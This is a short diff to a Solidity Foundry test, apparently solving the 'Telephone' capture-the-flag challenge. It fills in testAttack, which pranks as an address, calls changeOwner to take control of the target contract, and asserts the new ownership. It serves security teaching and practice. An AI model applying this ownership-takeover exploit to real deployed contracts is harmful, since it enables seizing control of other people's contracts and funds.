@@ -14,5 +14,10 @@ contract TelephoneTest is Test {
     }
 
     /// @dev Claims ownership of the contract
-    function testAttack() public {}
+    function testAttack() public {
+        vm.startPrank(p);
+        c.changeOwner(payable(address(p)));
+        vm.stopPrank();
+        assertEq(p, c.owner());
+    }
 }
